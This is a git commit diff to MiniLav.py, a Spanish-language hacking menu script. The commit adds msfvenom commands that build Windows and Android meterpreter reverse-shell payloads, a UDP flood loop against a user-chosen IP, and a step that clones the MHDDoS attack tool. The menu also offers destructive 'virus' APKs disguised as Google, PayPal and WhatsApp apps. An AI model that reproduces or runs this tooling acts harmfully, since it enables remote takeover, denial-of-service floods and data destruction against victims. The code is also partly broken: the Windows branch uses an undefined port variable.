d230e0e3345d29db25e09285975409a8c61156df
74lg0 <111157836+74lg0@users.noreply.github.com>
2023-04-12 21:55:18 -0600

    Update MiniLav.py

--- MiniLav.py
+++ MiniLav.py
@@ -4,10 +4,11 @@ from os import system
 from colorama import Fore
 import time
 import sys
-
-#----------Operative System------
-
+import socket
+import random
+ 
 #----------------Banner-----------
+
 
 def banner():
     print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
@@ -17,6 +18,31 @@ def banner():
     print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
     print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
     print("              https://t.me/HackingAndPrograming")
+
+
+
+
+for i in range (4):
+    system("clear")
+    print("Cargando...\ ")
+    time.sleep(0.2)
+    system("clear")
+    print("Cargando...|")
+    time.sleep(0.2)
+    system("clear")
+    print("Cargando.../")
+    time.sleep(0.2)
+    system("clear")
+    print("Cargando... -")
+    time.sleep(0.2)
+    system("clear")
+
+
+print("Cargando...\ ")
+time.sleep(2)
+
+#----------------Socket-------------
+sock_socket=socket.socket(socket.AF_INET)
 
 while True:
     system("clear")
@@ -57,13 +83,12 @@ while True:
     print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Creador:"+ Fore.GREEN+ "74lg0" + Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´")
     print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Version:"+ Fore.BLUE+ "1.2"+Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´´´´´")
     print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.YELLOW+ "Hackeando desde android"+ Fore.BLUE+ "´´´´´´´´´´´´´´´")
-    print(Fore.BLUE+ "´´´´´´´´´´´" + Fore.GREEN+ "https://t.me/HackingAndPrograming" + Fore.BLUE+ "´´´´´´´´´´´´´´´")
     
     #----------------Menu-------------
     
     #Nota: int(input()) te toma un numero literal, input() te lo toma como string
     
-    print(Fore.RED+ "[1]" + Fore.YELLOW+ "Viruz acceso al dispositivo" , Fore.RED+ "\n[2]"+ Fore.YELLOW+ "Viruz elimina todo"+ Fore.RED+ "\n[3]" + Fore.YELLOW+ "Salir del programa"+ Fore.RED+ "\n[4]"+ Fore.YELLOW+ "Escaneo con Nmap a direcciones IP"+ Fore.GREEN+ "[NEW]")
+    print(Fore.RED+ "[1]" + Fore.YELLOW+ "Viruz acceso al dispositivo" , Fore.RED+ "\n[2]"+ Fore.YELLOW+ "Viruz elimina todo"+ Fore.RED+ "\n[3]" + Fore.YELLOW+ "Salir del programa"+ Fore.RED+ "\n[4]"+ Fore.YELLOW+ "Escaneo con Nmap a direcciones IP"+ Fore.GREEN+ "[NEW]"+ Fore.RED+ "\n[5]"+ Fore.YELLOW+ "Ataque DoS a direcciones IP"+ Fore.GREEN+"[NEW]")
     eleccion=input(Fore.GREEN+"~"+ Fore.WHITE+ "$ Elije una opcion: ")
     #----------------Options1 and banner2----------
     if eleccion == "1":
@@ -95,21 +120,32 @@ while True:
         print(Fore.RED+ "                          Creador:"+ Fore.YELLOW+ "74lg0")
         print(Fore.RED+ "                          Version:"+ Fore.BLUE+ "1.2")
         print(Fore.YELLOW+ "                        Hacking MetaSploit")
+        print(Fore.RED+"[1]"+ Fore.WHITE+"Windows"+Fore.RED+"\n[2]"+Fore.WHITE+"Android"+Fore.RED+"\n[99]"+Fore.WHITE+"Regresar al menu")
+        eleccionmetaSO=int(input("Elije una opcion: "))
+        if eleccionmetaSO == 1:
+            print("Jenerando archivo...")
+            eleccionmeta=input(Fore.GREEN+ "Ingresa el LHOST: ")#<-------LHOST
+            
+            eleccionmeta2=input("    Ingresa el nombre del archivo: ")#<-------Nombre del archivo
+            
+            
+            
+            system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + eleccionmeta + " LPORT="+ eleccionmeta3+  "-f exe >" + eleccionmeta2+".exe")#<---archivo...
+        elif eleccionmetaSO == 2:
+            eleccionmeta=input(Fore.GREEN+ "Ingresa el LHOST: ")#<-------LHOST
+            
+            eleccionmeta2=input("Ingresa el nombre del archivo: ")#<-------Nombre del archivo
+            eleccionmeta3=input("    Ingresa el puerto: ")#<-------
+            
+            system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + eleccionmeta + " LPORT="+ eleccionmeta3 + " -f apk >"+eleccionmeta2+".apk")#<---archivo...
         
-        
-        print(Fore.RED+ "                https://t.me/HackingAndPrograming")
-        print(Fore.YELLOW+ "\n------------------------------------------")
-        print("Nota:El archivo solo funciona para windows")
-        print("------------------------------------------")
-        print("Jenerando archivo...")
-        eleccionmeta=input(Fore.GREEN+ "Ingresa tu IP privada: ")#<-------Direccion IP privada
- 
-        eleccionmeta2=input("Ingresa el nombre del archivo junto con el nombre de su extencion --> .exe ")#<-------Nombre del archivo
-        
-        system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + eleccionmeta + " LPORT=4444 -f exe >" + eleccionmeta2)#<-------Jenerando archivo...
-        
+        elif eleccionmetaSO == 99:
+            print(Fore.WHITE+"Regresando al menu...")
+            time.sleep(2)
+            
+            
         #----------------Options2 and banner3--------------------
-    if eleccion == "2":
+    elif eleccion == "2":
         print(Fore.GREEN+ "Cargando...")
         time.sleep(1)
         system("clear")
@@ -141,7 +177,7 @@ while True:
         #--------------15 archivoz-----------------
 
         print(Fore.BLUE+ "\n!ATENCION ESTOS VIRUZ ELIMINAN TODA LA INFORMACION DE LOS DISPOSITIVOZ!" , "\n--------los archivoz fueron tomados de otro script (papaviruz)-------")
-        print(Fore.RED+ "\n[1]" + Fore.YELLOW+ "Google.apk" , Fore.RED+ "\n[2]" + Fore.YELLOW+ "PlayStore.apk" , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux.apk" , Fore.RED+ "\n[4]" , Fore.YELLOW+ "Galeria.apk" , Fore.RED+ "\n[5]" , Fore.YELLOW+ "Gmail.apk" , Fore.RED+ "\n[6]" , Fore.YELLOW+ "Whatsapp Espia.apk" , Fore.RED+ "\n[7]" , Fore.YELLOW+ "Camara.apk" , Fore.RED+ "\n[8]" + Fore.YELLOW+ "Internet gratis.apk" , Fore.RED+ "\n[9]" , Fore.YELLOW+ "Whatsapp lite.apk" , Fore.RED+ "\n[10]" + Fore.YELLOW+ "PayPal.apk")
+        print(Fore.RED+ "\n[1]" + Fore.YELLOW+ "Google.apk" , Fore.RED+ "\n[2]" + Fore.YELLOW+ "PlayStore.apk" , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux.apk" , Fore.RED+ "\n[4]" , Fore.YELLOW+ "Galeria.apk" , Fore.RED+ "\n[5]" , Fore.YELLOW+ "Gmail.apk" , Fore.RED+ "\n[6]" , Fore.YELLOW+ "Whatsapp Espia.apk" , Fore.RED+ "\n[7]" , Fore.YELLOW+ "Camara.apk" , Fore.RED+ "\n[8]" + Fore.YELLOW+ "Internet gratis.apk" , Fore.RED+ "\n[9]" , Fore.YELLOW+ "Whatsapp lite.apk" , Fore.RED+ "\n[10]" + Fore.YELLOW+ "PayPal.apk"+ Fore.RED+"\n[99]"+Fore.WHITE+"Regresar al menu")
         eleccionarch=input(Fore.RED+ "~~Elige una opcion: ")
 #-------Options2 and opcion1-------
         if eleccionarch == "1":
@@ -205,8 +241,7 @@ while True:
         elif eleccionarch == "6":
             print(Fore.YELLOW+ "Cargando...")
             time.sleep(2)
-            system("clear")
-            
+
             banner()#<--------Funcion de Banner
             
             elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
@@ -230,7 +265,7 @@ while True:
             system("clear")
             
             banner()#<--------Funcion de Banner
-            
+
             elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
             print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
             time.sleep(3)
@@ -256,6 +291,12 @@ while True:
             elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
             print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
             time.sleep(3)
+            
+        elif eleccionarch == "99":
+            print("Regresando al menu")
+            time.sleep(3)
+            system("clear")
+            
 
 #---------Invalid Options----------
         
@@ -271,7 +312,7 @@ while True:
             print("[% |__|__|__||_____||____||___._||%$P `       ||   __||__||_____||__||____|%%]")
             print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| ` a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]")
             print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`';a,$$_|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")
-            print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `'$    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")
+            print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `'$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")
             print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")
 
             print("                        https://t.me/HackingAndPrograming")
@@ -309,7 +350,7 @@ while True:
         nmap=input(Fore.WHITE+ "ya tienes instalado nmap" + Fore.GREEN+ " Y"+Fore.WHITE+"/"+Fore.RED+"N"+ Fore.GREEN+"\n~"+ Fore.WHITE+ "$ ")
         if nmap == "y":
             print(Fore.WHITE+ "Deseas analizar una IPv4 o una IPv6")
-            print(Fore.RED+"[1]"+ Fore.WHITE+"IPv4"+ Fore.RED+"\n[2]"+ Fore.WHITE+"IPv6")
+            print(Fore.RED+"[1]"+ Fore.WHITE+"IPv4"+ Fore.RED+"\n[2]"+ Fore.WHITE+"IPv6"+Fore.RED+"\n[99]"+Fore.WHITE+"Regresar al menu"+Fore.RED+"\n[00]"+Fore.WHITE+"Ver mi IP")
             Nmap=input(Fore.GREEN+"~"+ Fore.WHITE+"$ ")
             if Nmap == "1":
                 print("Checando Nmap...")
@@ -325,11 +366,21 @@ while True:
                 system("nmap -6 "+ Nmap3)
                 time.sleep(3)
                 break
+            elif Nmap == "99":
+                print("Regresando al Menu...")
+                time.sleep(3)
+            
+            elif Nmap == "00":
+                print("Tu IP es:")
+                system("curl ifconfig.me")
+                time.sleep(2)
+                break
                 
         elif nmap == "n":
             print("Instalando Nmap...")
             print("Sistema Operativo"+"\n[1] Termux \n[2] Otra distribucion de Linux")
             SO=input(Fore.GREEN+"~"+Fore.WHITE+"$ ")
+            
             if SO == "1":
                 print("Istalando Nmap...")
                 system("pkg install nmap -y")
@@ -346,8 +397,42 @@ while True:
             time.sleep(2)
             
     
-#--------Exit-------------
-    
+    elif eleccion == "5":
+        system("clear")
+        pre_DOS=input("\n\nDeseas usar el ataque DoS predeterminado\nO deseas instalar una herramienta mas optimizada para este tipo de ataques"+ Fore.GREEN+"\n(y)"+Fore.WHITE+"Si, deseo instalar el repositorio"+Fore.RED+"\n(n)"+Fore.WHITE+"No, deseo usar el ataque predeterminado\n"+Fore.GREEN+"~"+Fore.WHITE+"$ ")
+        if pre_DOS == "y":
+            print("Instalando repositorio...")
+            time.sleep(2)
+            system("git clone https://github.com/MatrixTM/MHDDoS.git")
+            print("Despues de la instalacion usa "+Fore.GREEN+"cd MHDDoS "+Fore.WHITE+"Y instala los requirements.txt")
+            break
+        
+        elif pre_DOS == "n":
+            print("Entendido ;)")
+            time.sleep(2)
+            system("clear")
+            sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            bytes=random._urandom(51200)
+            print(Fore.GREEN+"\n\n██████╗░██████╗░░█████╗░░██████╗")
+            print("██╔══██╗██╔══██╗██╔══██╗██╔════╝")
+            print("██║░░██║██║░░██║██║░░██║╚█████╗")
+            print("██║░░██║██║░░██║██║░░██║░╚═══██╗")
+            print("██████╔╝██████╔╝╚█████╔╝██████╔╝")
+            print("╚═════╝░╚═════╝░░╚════╝░╚═════╝░")
+            ip=input(Fore.BLUE+"Ingresa la IP: ")
+            port=int(input("Ingresa el puerto: "))
+            sent=0
+            while True:
+                sock.sendto(bytes, (ip,port))
+                sent=sent+1
+                port=port+1
+                print("Paquete %s enviado %s a través del puerto:%s" % (sent, ip, port))
+                if port==65534:
+                    port=1
+        else:
+            print("Opcion Invalida...")
+            time.sleep(2)
+        
     elif eleccion == "3":
         exit=input(Fore.GREEN+ "~" +Fore.WHITE+ "$ Deseas salir del  programa? y/n" + Fore.GREEN+ "\n~"+ Fore.WHITE+ "$ ")
         if exit == "y":
